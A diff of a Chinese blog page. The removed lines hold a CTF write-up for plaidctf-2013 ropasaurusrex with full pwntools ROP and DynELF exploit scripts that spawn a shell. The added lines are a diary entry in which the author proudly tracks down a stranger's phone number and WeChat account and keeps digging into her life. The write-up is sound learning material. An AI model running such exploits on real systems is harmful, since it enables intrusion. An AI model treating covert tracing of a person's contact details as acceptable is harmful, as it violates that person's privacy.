@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>plaidctf-2013-ropasaurusrex(DynELF) | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" DynELF , ROP ">
-  <meta name="description" content="plaidctf-2013-ropasaurusrex(DynELF) | sixpar&#39;s blog">
+  <title>2020年7月15日小记 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" 日记 ">
+  <meta name="description" content="2020年7月15日小记 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -588,9 +588,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-plaidctf-2013-ropasaurusrex-DynELF" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-2020年7月15日小记" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">plaidctf-2013-ropasaurusrex(DynELF)</h1>
+        <h1 class="article-title">2020年7月15日小记</h1>
     
     <div class="article-meta">
         
@@ -600,7 +600,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="PWN题">PWN题</a>
+            <a  data-rel="生活">生活</a>
             
         </span>
         
@@ -608,21 +608,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color2">DynELF</a>
-            
-            <a class="color4">ROP</a>
+            <a class="color3">日记</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-12 22:48:51'>2020-07-12 22:13</time>
+            Created At : <time class="date" title='Updated At: 2020-07-15 22:52:51'>2020-07-15 22:07</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:1.3k</span>
+        <span>Count:829</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -652,7 +650,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍："><span class="toc-text">介绍：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload样式："><span class="toc-text">payload样式：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例题：plaidctf-2013-ropasaurusrex"><span class="toc-text">例题：plaidctf-2013 - ropasaurusrex</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#保护机制："><span class="toc-text">保护机制：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序："><span class="toc-text">分析程序：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#做法一："><span class="toc-text">做法一：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#做法二："><span class="toc-text">做法二：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -668,78 +666,19 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>对于不同版本的libc，函数首地址相对于文件开头的偏移和函数间的偏移各不相同；如果题目不提供libc，我们通过泄露任意一个库函数地址就无法推算出system函数地址，（因为没有libc版本，不知道与system函数之间的偏移）</p>
-<p>所以我们就要想办法获取目标系统的libc的版本，这里介绍一种获取远程libc版本的方法：dynELF。</p>
-<p>DynELF就是通过程序漏洞泄露出任意地址内容，结合ELF文件的结构特征获取对应版本文件并计算对比出目标符号（比如system）在内存中的地址</p>
-<p>也就是说，若程序没有 libc，但却有任意地址内存泄露函数（比如puts，write等）的情况下，可以利用DynELF 解析任意加载库的任意符号地址。（其中涉及ELF文件中的 hash表，动态符号表，字符串表，Dynamic段，link_map结构）</p>
-<h2 id="payload样式："><a href="#payload样式：" class="headerlink" title="payload样式："></a>payload样式：</h2><p>payload样式如下:</p>
-<pre><code class="python">def leak(address):
-    #泄露
-    payload1 = &#39;a&#39;*(paddings) + p32(plt_write) + p32(vulfun_addr) + p32(1) + p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    return data  #返回泄露的数据
-
-d=DynELF(leak,elf=ELF(&#39;./filename&#39;))   
-#使用一个leak函数作为必选参数，指向ELF文件的指针或者使用ELF类加载的目标文件至少提供一个作为可选参数，以初始化一个DynELF类的实例d
-system_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)   
-#通过这个实例d的lookup方法来搜寻libc库函数，找到system的字符，得到地址</code></pre>
-<p>可见leak函数中前提是必须实现一个基本的<code>泄露</code>功能。</p>
-<p>我们这里使用的是write函数。构造基本的ROP链：填充paddings垃圾数据返回地址覆盖为write函数的plt地址，参数什么的也事先压入栈中，write_plt执行完后再次跳转到漏洞点，使得能重复利用溢出漏洞进行打印泄露地址。</p>
-<p>其中，leak函数需要使用目标程序本身的漏洞泄露出由DynELF类传入的int型参数addr对应的内存地址中的数据。由于DynELF方法会多次调用leak函数，所以这个函数必须能任意次使用，即不能泄露几个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等；<br>通过实践发现 <code>write</code> 函数是最理想的，因为write函数的特点在于其<code>输出完全由其参数size决定</code>，只要目标地址可读，size填多少就输出多少，<code>不会受到诸如‘\0’, ‘\n’之类的字符影响</code>；而puts, printf函数会受到诸如‘\0’, ‘\n’之类的字符影响，在对数据的读取和处理有一定的难度</p>
-<h2 id="例题：plaidctf-2013-ropasaurusrex"><a href="#例题：plaidctf-2013-ropasaurusrex" class="headerlink" title="例题：plaidctf-2013 - ropasaurusrex"></a>例题：plaidctf-2013 - ropasaurusrex</h2><p>本题貌似没有给出远程的libc，不过本地使用libc.so.6能打通。</p>
-<h3 id="保护机制："><a href="#保护机制：" class="headerlink" title="保护机制："></a>保护机制：</h3><blockquote>
-<p>Arch:     i386-32-little<br>RELRO:    No RELRO<br>Stack:    No canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x8048000)</p>
-</blockquote>
-<h3 id="分析程序："><a href="#分析程序：" class="headerlink" title="分析程序："></a>分析程序：</h3><p>程序简简单单，执行一个read函数后打印‘win’，程序结束，呃呃呃。<br>read函数存在栈溢出漏洞，buf大小是0x88h，而能输入0x100</p>
-<p>有两种做法，一种是简单ROP，另一种是比较复杂的DynELF。</p>
-<h4 id="做法一："><a href="#做法一：" class="headerlink" title="做法一："></a>做法一：</h4><p>简单ROP：</p>
-<pre><code class="python">from pwn import *
-p=process(&#39;./ropasaurusrex&#39;)
-elf=ELF(&#39;./ropasaurusrex&#39;)
-libc=ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
-write_plt=elf.plt[&#39;write&#39;]
-write_got=elf.got[&#39;write&#39;]
-vuln_addr=0x80483F4
-payload=&#39;a&#39;*140+p32(write_plt)+p32(vuln_addr)+p32(1)+p32(write_got)+p32(4)
-p.sendline(payload)
-write_addr=u32(p.recv(4))
-print &quot;write_addr :&quot;+hex(write_addr)
-libc_base=write_addr-libc.symbols[&#39;write&#39;]
-sys_addr=libc_base+libc.symbols[&#39;system&#39;]
-bin_addr=libc_base+libc.search(&#39;/bin/sh\x00&#39;).next()
-# write down ,retn to vuln_addr 
-# read again !
-payload1=&#39;a&#39;*140+p32(sys_addr)+p32(1234)+p32(bin_addr)
-p.sendline(payload1)
-p.interactive()</code></pre>
-<p>exp就不解释了，感觉是最基本的ROP题目了。</p>
-<h4 id="做法二："><a href="#做法二：" class="headerlink" title="做法二："></a>做法二：</h4><pre><code class="python">from pwn import *
-pro = &#39;./ropasaurusrex&#39;
-p = process(pro)
-elf = ELF(pro)
-start_addr = 0x8048340
-
-def leak(addr):
-    payload = &#39;a&#39;*(0x88+4) + p32(elf.plt[&#39;write&#39;]) + p32(start_addr)  # retn to start_addr
-    payload+= p32(1) + p32(addr) + p32(8)  # args of write
-    # we leak All of ELF file&#39;s addr !?
-    p.sendline(payload)
-    context = p.recv(8)
-    print(&quot;%#x -&gt; %s&quot; %(addr, (context or &#39;&#39;).encode(&#39;hex&#39;)))   #print
-    return context
-
-d = DynELF(leak,elf = elf)
-system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;)  # look for &#39;system&#39; from context
-read_addr = d.lookup(&#39;read&#39;,&#39;libc&#39;)
-print &quot;system_addr: &quot; + hex(system_addr)
-print &quot;read_addr: &quot; + hex(read_addr)
-
-p.sendline(&#39;a&#39;*(0x88+4) + p32(read_addr) + p32(system_addr) + p32(0) + p32(elf.bss()+100) + p32(8))
-p.sendline(&#39;/bin/sh\x00&#39;) # read &#39;/bin/sh&#39; to  bss+100
-p.interactive()</code></pre>
-<p>exp运行起来后，会打印ELF文件的内存。然后再去寻找‘system’字符。<br>不过这里是调用read函数读取binsh字符串到bss段上。手法值得学习。</p>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>什么时候选择DynELF方法？<br>程序里得有write（最好是write，输出大小只由size决定）等输出函数，且可以反复调用（不能调用后就崩了）。DynELF找的是字符串。得注意有时候程序里没有/bin/sh字符串，我们就可以计算read函数地址，然后方便我们写入binsh字符串到bss+100（这个地址随便的吧）上。然后调用system。</p>
+        <p>我日思夜想的快递今天终于到了！<br>中午顶着大太阳，撑着把黑伞，骑着自行车，直奔快递站。风挺大的，伞大招风，单手不好骑，容易被吹走。呜呜不容易啊。</p>
+<p>这次在网上买了三本书，分别是《漏洞战争》、《加密与解密》、《0day安全软件漏洞分析技术》。<br>都是贼厚的那种，平均4cm厚，一板砖书砸skr人。</p>
+<p>没错，《0day安全软件漏洞分析技术》 这本书已经绝版了，网上二手的又卖的贼贵（某宝上卖￥400+，疯了？），所以只好买了个影印版，也很便宜。（个人还是力挺正版的，实在是没办法惹）</p>
+<p>这三本书都是二进制漏洞利用相关的书籍（我要钻研二进制），虽然都有它们的PDF版，但还是纸质书看起来舒服呀，还可以在旁做做笔记啥的。</p>
+<p>今天下午已经开始在看《加密与解密》了，介绍了ollydbg的基本用法， 然后开始上手第一个例子：traceme.exe，主张在API函数这儿下断点，由于消息框里的文本数据是由GetDlgItemTextA函数接收读取的，所以可以在此函数处下断，然后调用到该API函数时就自动截断……不对劲，怎么开始讲题目惹 QAQ</p>
+<p>说回日记，现在我正在考虑还要不要参加护网，接下去时间我就想在家里宅着，然后把这三本书给啃掉。（当然了得先应问清楚具体的情况后再做定夺）</p>
+<p>今天晚上本来想跑步，但是没想到白天还是大太阳，晚上就开始起雾，下起了毛毛雨，现在还打雷了。<br>只好在家看书。</p>
+<p>淦，自从加了考研资料群，成天滴滴滴，@ 永无止境，刚刚又滴我。</p>
+<p>说到考研，我就认准一个目标院校。</p>
+<p>然后今天晚上我在B栈搜索目标院校的相关视频时，看到目标院校的一位学姐在拍vlog，然后也是在读研究生，我私信了她，但迟迟未回我，这得等到猴年马月？不知道学姐何时才能上一回B站，所以我只好动歪脑筋。<br>所谓社工，手动滑稽。<br>最终让我在某处发现了一串数字（没错我就是列文虎克），11位，很像电话号码，于是我用手机号搜了微信，昵称看起来和B栈昵称很像，地址也和某期视频里提到的地址是一样的，确认了，先加了再说。如果不是up，那也是和up相关的人。</p>
+<p>后来已验证，还真是up的微信[笑哭]，学姐是保研的（呜呜tql），所以我通过她得到了另一位学长的微信，学长他是考研上岸的，看来以后可以多多请教他啦。 幸运欸。</p>
+<p>事后，我的好奇心推动着我继续社工，然后又发现了很有意思的东西，在这里我就不讲了，只能说学姐真是一位热爱生活的人啊。</p>
+<p>最后，我想对自己说，永远也不要怀疑自己，永远也不要埋怨自己，永远也不要放任自己。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
